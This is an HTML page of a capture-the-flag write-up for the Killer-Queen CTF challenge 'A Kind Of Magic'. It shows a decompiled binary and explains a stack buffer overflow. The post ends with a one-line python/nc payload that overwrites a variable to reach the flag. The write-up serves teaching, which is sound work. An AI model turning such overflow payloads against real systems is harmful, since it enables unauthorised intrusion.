@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="map[name:Lucas Sass Rósinberg]">
+<meta name="description" content="A Kind Of Magic We get a binary, which asks us for a magic input and outputs &amp;ldquo;Your magic is&amp;rdquo;, followed by a number. This is 0 unless the input is fairly large. We can test the length and find that the output is 0 until we write the 40th character - then it will always be 10.
+That it is 10 is interesting, since this is the ASCII value of a newline - so it could seem like we fill a buffer with 44 characters and the next character is printed back, which will then always be a newline." />
+<meta name="keywords" content="CTF" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://github.com/Lucassass/CTF-Writeups.github.io/posts/akindofmagic/" />
+
+
+    <title>
+        
+            Killer-Queen CTF: A Kind Of Magic :: Hello Friend  — A Simple CTF Writeup site/blog
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/Lucassass/CTF-Writeups.github.io/main.17863a81d979b637a02cd7632a4d86e9d80563ef460fd6af1a56962efcaa066b.css">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/Lucassass/CTF-Writeups.github.io/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/Lucassass/CTF-Writeups.github.io/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/Lucassass/CTF-Writeups.github.io/favicon-16x16.png">
+    <link rel="manifest" href="/Lucassass/CTF-Writeups.github.io/site.webmanifest">
+    <link rel="mask-icon" href="/Lucassass/CTF-Writeups.github.io/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/Lucassass/CTF-Writeups.github.io/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+    <meta name="theme-color" content="">
+
+
+
+<meta itemprop="name" content="Killer-Queen CTF: A Kind Of Magic">
+<meta itemprop="description" content="A Kind Of Magic We get a binary, which asks us for a magic input and outputs &ldquo;Your magic is&rdquo;, followed by a number. This is 0 unless the input is fairly large. We can test the length and find that the output is 0 until we write the 40th character - then it will always be 10.
+That it is 10 is interesting, since this is the ASCII value of a newline - so it could seem like we fill a buffer with 44 characters and the next character is printed back, which will then always be a newline."><meta itemprop="datePublished" content="2021-10-29T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2021-10-29T00:00:00+00:00" />
+<meta itemprop="wordCount" content="313">
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Killer-Queen CTF: A Kind Of Magic"/>
+<meta name="twitter:description" content="A Kind Of Magic We get a binary, which asks us for a magic input and outputs &ldquo;Your magic is&rdquo;, followed by a number. This is 0 unless the input is fairly large. We can test the length and find that the output is 0 until we write the 40th character - then it will always be 10.
+That it is 10 is interesting, since this is the ASCII value of a newline - so it could seem like we fill a buffer with 44 characters and the next character is printed back, which will then always be a newline."/>
+
+
+
+
+
+
+
+
+    <meta property="article:published_time" content="2021-10-29 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/Lucassass/CTF-Writeups.github.io" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">hello friend</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/Lucassass/CTF-Writeups.github.io/about">About</a></li><li><a href="/Lucassass/CTF-Writeups.github.io/posts">posts</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        2 minutes
+
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="https://github.com/Lucassass/CTF-Writeups.github.io/posts/akindofmagic/">Killer-Queen CTF: A Kind Of Magic</a>
+      </h1>
+
+      
+
+      
+
+      
+
+      <div class="post-content">
+        <h1 id="a-kind-of-magic">A Kind Of Magic</h1>
+<p>We get a binary, which asks us for a magic input and outputs &ldquo;Your magic is&rdquo;, followed by a number. This is 0 unless the input is fairly large. We can test the length and find that the output is 0 until we write the 40th character - then it will always be 10.</p>
+<p>That it is 10 is interesting, since this is the ASCII value of a newline - so it could seem like we fill a buffer with 44 characters and the next character is printed back, which will then always be a newline.</p>
+<p>Looking into the code in Cutter and decompiling, it looks fairly simple:</p>
+<pre tabindex="0"><code class="language-clike=" data-lang="clike=">main(int argc, char **argv)
+{
+    char **var_40h;
+    int var_34h;
+    char *s;
+    unsigned long var_4h;
+
+    var_4h = 0;
+    puts(&quot;Is this a kind of magic? What is your magic?: &quot;);
+    fflush(_stdout);
+    fgets(&amp;s, 0x40, _stdin);
+    printf(&quot;You entered %s\n&quot;, &amp;s);
+    printf(&quot;Your magic is: %d\n&quot;, var_4h);
+    fflush(_stdout);
+    if (var_4h == 0x539) {
+        puts(&quot;Whoa we got a magic man here!&quot;);
+        fflush(_stdout);
+        system(&quot;cat flag.txt&quot;);
+    } else {
+        puts(&quot;You need to challenge the doors of time&quot;);
+        fflush(_stdout);
+    }
+    return 0;
+}
+</code></pre><p>It initializes a string <code>char* s</code> and a value <code>var_4h = 0</code>. It then takes an input up to 64 characters and assigns to the string. But perhaps the buffer for the string is not as large (44 characters according to our test). This means the next characters overflow into <code>var_4h</code>, which is then printed. So we can basically insert any number we want into <code>var_4h</code>.</p>
+<p>This is very useful, since the next condition checks if <code>var_4h == 0x539</code> and if so, we get the flag.</p>
+<p>So we can simply pass in 44 random bytes followed by 0x539 (followed by some null bytes to get the newline out of the integer and into the next field):</p>
+<pre tabindex="0"><code>python2 -c &quot;print b'A' * 44 + b'\x39\x05\x00\x00'&quot; | nc 143.198.184.186 5000
+</code></pre>
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+      
+      
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        313 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2021-10-29 02:00
+        
+
+         
+          
+        
+      </p>
+    </div>
+
+    
+    <div class="pagination">
+        <div class="pagination__title">
+            <span class="pagination__title-h"></span>
+            <hr />
+        </div>
+
+        <div class="pagination__buttons">
+            
+
+            
+            <span class="button next">
+                <a href="https://github.com/Lucassass/CTF-Writeups.github.io/posts/brokecollegestudents/">
+                    <span class="button__text">Killer-Queen CTF: Broke College Students</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
+        </div>
+    </div>
+
+
+    
+
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/Lucassass/CTF-Writeups.github.io/bundle.min.599099f1f14b78b657d524b28e10e0c5098e7cd46e9c7aed73d577068a276c3ff1bb234cbf29cb313333e83cf411727b43157c91ce5b809e2ffc81664614608e.js" integrity="sha512-WZCZ8fFLeLZX1SSyjhDgxQmOfNRunHrtc9V3BoonbD/xuyNMvynLMTMz6Dz0EXJ7QxV8kc5bgJ4v/IFmRhRgjg=="></script>
+
+
+
+    </body>
+</html>
